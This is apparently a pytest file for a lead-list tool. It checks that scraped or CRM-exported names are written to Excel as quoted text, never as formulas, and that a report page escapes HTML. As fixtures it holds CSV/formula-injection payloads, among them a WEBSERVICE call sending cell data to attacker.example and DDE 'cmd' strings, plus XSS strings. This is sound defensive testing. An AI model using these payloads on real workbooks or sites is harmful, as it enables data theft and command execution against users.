"""No name from a scraped page or a CRM export is ever written as a spreadsheet formula.

A person who opens a lead list trusts it. A name such as =HYPERLINK(...) must
arrive in the workbook as text, and still be the same name when the program
reads its own workbook back.
"""
import html

import pandas as pd
import pytest
from openpyxl import load_workbook

from leadlist import config, crossref, municipality_filter, scrape_congress, scrape_programme
from leadlist.mock import generate, server
from leadlist.workbook import FORMULA_TRIGGERS, neutralise, read_report, read_sheet, restore, write_workbook

HOSTILE_PERSON = '=HYPERLINK("http://attacker.example","Edit Snarpvall")'
HOSTILE_ORG = "+Krymtivnö Bygg AB"
HOSTILE_SHORT_ORG = "@Krymtivnö"
HOSTILE_TITLE = "-2+3+cmd|' /C calc'!A0"
HOSTILE_EMAIL = "@SUM(1+1)*cmd|' /C calc'!A0"
HOSTILE_SUBJECT = '=WEBSERVICE("http://attacker.example/"&A1)'
NEW_PERSON, PAST_CONTACT = "Vidar Krokstig", "-Tyra Blomvass"


def cells(path):
    """Every cell of every sheet, as the file holds it: formulas as formulas, not as their results."""
    book = load_workbook(path)
    return [(sheet.title, cell) for sheet in book for row in sheet.iter_rows() for cell in row if cell.value is not None]


def assert_no_formula(path) -> int:
    found = cells(path)
    for sheet, cell in found:
        where = f"{path.name} {sheet}!{cell.coordinate}: {cell.value!r}"
        assert cell.data_type != "f", where
        assert not (isinstance(cell.value, str) and cell.value.startswith(FORMULA_TRIGGERS)), where
    return len(found)


# -- one cell at a time ----------------------------------------------------------------------------

@pytest.mark.parametrize("trigger", ["=", "+", "-", "@", "\t", "\r"])
def test_each_trigger_character_is_stored_as_text_and_comes_back_unchanged(tmp_path, trigger):
    value = trigger + 'HYPERLINK("http://attacker.example","Edit Snarpvall")'
    frame = pd.DataFrame({"Name": [value, "Edit Snarpvall", trigger], trigger + "Header": ["a", "b", "c"]})
    path = write_workbook(tmp_path / "w.xlsx", {"People": frame})

    sheet = load_workbook(path)["People"]
    for row in sheet.iter_rows():
        for cell in row:
            assert cell.data_type == "s" and not cell.value.startswith(FORMULA_TRIGGERS)
    assert sheet["A2"].value.startswith("'" + trigger) or trigger == "\r"      # the standard defence: a leading quote
    assert assert_no_formula(path) == 8

    back = read_sheet(path, "People")
    # A carriage return is the one character XML does not keep: it comes back as a line feed. Nothing else changes.
    as_read = value.replace("\r", "\n")
    assert back.columns.tolist() == ["Name", (trigger + "Header").replace("\r", "\n")]
    assert back["Name"].tolist() == [as_read, "Edit Snarpvall", trigger.replace("\r", "\n")]
    assert len(back) == 3                                                       # no row is lost


@pytest.mark.parametrize("value", [
    "'=1+1", "''=1+1", "'-", "'", "''", "'Edit", "O'Snarpvall", "=", "-", "--", "+46 70 000 00 00", "-5", "@", "a=b",
    " =1+1", "Edit Snarpvall", "", "NA", "\n=1+1",
])
def test_the_quote_is_put_on_and_taken_off_without_changing_the_value(tmp_path, value):
    assert restore(neutralise(value)) == value
    assert not neutralise(value).startswith(FORMULA_TRIGGERS)
    # A value that already opens with a quote and a trigger gets one more quote, so that even it comes back whole.
    path = write_workbook(tmp_path / "w.xlsx", {"S": pd.DataFrame({"V": [value, "x"]})})
    assert read_sheet(path, "S")["V"].tolist() == [value, "x"]
    assert_no_formula(path)


def test_numbers_and_dates_are_left_as_they_are(tmp_path):
    frame = pd.DataFrame({"Amount": [-5.5, 3.0], "Count": [-2, 7], "When": pd.to_datetime(["2031-03-04", "2031-03-05"])})
    path = write_workbook(tmp_path / "w.xlsx", {"S": frame, "Empty": pd.DataFrame()})
    sheet = load_workbook(path)["S"]
    assert [sheet["A2"].value, sheet["B2"].value, sheet["A2"].data_type] == [-5.5, -2, "n"]
    assert sheet["C2"].data_type == "d"


def test_a_crm_export_is_read_as_it_is(tmp_path):
    """read_report reads someone else's file. A quote there is part of the value and stays."""
    frame = pd.DataFrame({"Account Name": ["'=Krymtivnö Bygg AB", "'+Krymtivnö", "Krymtivnö"], "Amount": [1, 2, 3]})
    path = tmp_path / "export.xlsx"
    frame.to_excel(path, index=False)
    assert read_report(path, ["Account Name", "Amount"])["Account Name"].tolist() == frame["Account Name"].tolist()
    assert read_sheet(path, "Sheet1")["Account Name"].tolist() == ["=Krymtivnö Bygg AB", "+Krymtivnö", "Krymtivnö"]


# -- from a scraped page to the lead lists ---------------------------------------------------------

def _person(tag: str, name: str, title: str, organisation: str, email: str = "") -> str:
    e = html.escape
    mail = f'<a class="email" href="mailto:{e(email)}">{e(email)}</a>' if email else ""
    return (f'<{tag} class="person"><span class="name">{e(name)}</span> <span class="title">{e(title)}</span> '
            f'<span class="org">{e(organisation)}</span> {mail}</{tag}>')


def _add_hostile_event(settings) -> None:
    """One more event page on the mock site, linked from the first list page."""
    folder = settings.mock / "site" / "programme"
    (folder / "event-9001.html").write_text(f"""<!doctype html><html lang="sv"><body>
<article class="event" data-event-id="9001">
<h1>=cmd|' /C calc'!A0</h1>
<p class="when"><time datetime="2031-03-04T09:00">2031-03-04 09:00</time></p>
<p class="organiser">{html.escape(HOSTILE_SHORT_ORG)}</p>
<section class="participants"><ul>
{_person("li", HOSTILE_PERSON, HOSTILE_TITLE, HOSTILE_ORG, HOSTILE_EMAIL)}
{_person("li", NEW_PERSON, "+VD", HOSTILE_SHORT_ORG)}
</ul></section>
<section class="contacts">
{_person("p", HOSTILE_PERSON, HOSTILE_TITLE, HOSTILE_ORG)}
</section>
</article></body></html>""", encoding="utf-8")
    index = folder / "index.html"
    listing = index.read_text(encoding="utf-8")
    assert listing.count("</ul>") == 1
    index.write_text(listing.replace(
        "</ul>", '<li><a class="event-link" href="event-9001.html">=1+1</a></li>\n</ul>'), encoding="utf-8")


def _add_hostile_meetings(settings) -> None:
    """Rows in the mock CRM export that give the hostile person and the hostile organisations a history."""
    columns = settings.meetings
    book = load_workbook(settings.meetings_file)
    sheet = book.active
    header = next(row for row in sheet.iter_rows() if {columns.account, columns.contact} <= {c.value for c in row})
    at = {cell.value: cell.column for cell in header if cell.value}
    rows = [
        {columns.account: HOSTILE_ORG, columns.contact: HOSTILE_PERSON, columns.subject: HOSTILE_SUBJECT},
        {columns.account: HOSTILE_SHORT_ORG, columns.contact: f"{PAST_CONTACT} ({columns.left_tag})",
         columns.subject: "+Uppföljning"},
    ]
    sheet.insert_rows(header[0].row + 1, len(rows))
    for offset, row in enumerate(rows, start=1):
        for name, value in row.items():
            cell = sheet.cell(row=header[0].row + offset, column=at[name], value=value)
            cell.data_type = "s"        # as an export holds a name: text, whatever it starts with
        sheet.cell(row=header[0].row + offset, column=at[columns.date], value="2030-11-0%d" % offset)
    book.save(settings.meetings_file)


@pytest.fixture(scope="module")
def run(tmp_path_factory):
    root = tmp_path_factory.mktemp("hostile")
    settings = config.Settings(root=root, work=root / "work", aliases=root / "config" / "a.yaml",
                               seed=5, events=40, port=0)
    generate.generate(settings)
    _add_hostile_event(settings)
    _add_hostile_meetings(settings)
    with server.running(settings.mock, settings.host, settings.port) as url:
        scrape_programme.run(url, settings)
        scrape_congress.run(url, settings)
    municipality_filter.run(settings)
    crossref.phase_one(settings)
    crossref.phase_two(settings, accept_undecided=True)
    return settings


def test_the_hostile_values_were_really_scraped_and_read(run):
    people = read_sheet(run.output / "participants.xlsx", "All_Participants")
    hostile = people[people["Name"] == HOSTILE_PERSON]
    assert hostile[["Title", "Email", "Organisation", "Source", "Event_IDs"]].values.tolist() == [
        [HOSTILE_TITLE, HOSTILE_EMAIL, HOSTILE_ORG, "Both", "9001"]]
    events = read_sheet(run.output / "participants.xlsx", "Events")
    assert events[events["Event_ID"] == "9001"][["Title", "Organiser"]].values.tolist() == [
        ["=cmd|' /C calc'!A0", HOSTILE_SHORT_ORG]]
    meetings = crossref.load_meetings(run, crossref.AliasTable())
    assert HOSTILE_PERSON in set(meetings["contact"]) and HOSTILE_SUBJECT in set(meetings["subject"])


def test_no_output_workbook_holds_a_formula_anywhere(run):
    workbooks = sorted(run.output.glob("*.xlsx"))
    assert {path.name for path in workbooks} == {
        "participants.xlsx", "congress.xlsx", "municipality_contacts.xlsx", "phase1_audit.xlsx", "lead_lists.xlsx",
        "match_audit.xlsx"}
    for path in workbooks:
        assert assert_no_formula(path) > 0
    # The hostile values are in there, held as text behind a quote.
    stored = {cell.value for _, cell in cells(run.output / "lead_lists.xlsx")}
    assert {"'" + HOSTILE_PERSON, "'" + HOSTILE_ORG, "'" + HOSTILE_SHORT_ORG, "'" + HOSTILE_TITLE,
            "'" + HOSTILE_EMAIL, "'" + HOSTILE_SUBJECT} <= stored


def test_the_hostile_person_is_on_a_lead_list_with_the_name_intact(run):
    personal = read_sheet(run.output / "lead_lists.xlsx", crossref.PERSONAL)
    row = personal[personal["Name"] == HOSTILE_PERSON]
    assert len(row) == 1
    assert row.iloc[0][["Title", "Email", "Organisation", "CRM_Account", "Past_Meetings", "Past_Subjects"]].tolist() == [
        HOSTILE_TITLE, HOSTILE_EMAIL, HOSTILE_ORG, HOSTILE_ORG, "1", HOSTILE_SUBJECT]

    account = read_sheet(run.output / "lead_lists.xlsx", crossref.ACCOUNT)
    row = account[account["Name"] == NEW_PERSON]
    assert len(row) == 1
    assert row.iloc[0][["Title", "Organisation", "CRM_Account", "Past_Contacts"]].tolist() == [
        "+VD", HOSTILE_SHORT_ORG, HOSTILE_SHORT_ORG, f"{PAST_CONTACT} ({run.meetings.left_tag})"]

    audit = read_sheet(run.output / "match_audit.xlsx", "Org_Match_Audit")
    assert {HOSTILE_ORG, HOSTILE_SHORT_ORG} <= set(audit["Organisation_As_Written"])


def test_hostile_text_is_escaped_in_the_report_page():
    from leadlist import report_page
    hostile = '<script>alert(1)</script> "Skvurmuxne" & <img src=x onerror=alert(2)>'
    score = {"rows": 1, "right": 0, "wrong": 1, "missed": 1, "wrong_rows": [hostile], "missed_people": [hostile]}
    lists = {name: dict(score) for name in ("Personal_Match", "Account_Match_New_Person", "Paid_Account_Match")}
    review = {"possible_collisions": 1, "to_review_at_phase_one": 1, "left_undecided": 1,
              "alias_entries_before": 0, "alias_entries_after": 0}
    report = {"finished": "<b>2027</b>", "phase_one": "x", "scrape": {"events": 1, "mentions": 1, "people": 1},
              "filter": None, "review": review, "lists": lists, "before_review": {"alias_entries": 0, "lists": lists}}
    page = report_page.render(report)
    assert "<script>alert" not in page and "<img src=x" not in page and "<b>2027</b>" not in page
    assert "&lt;script&gt;" in page
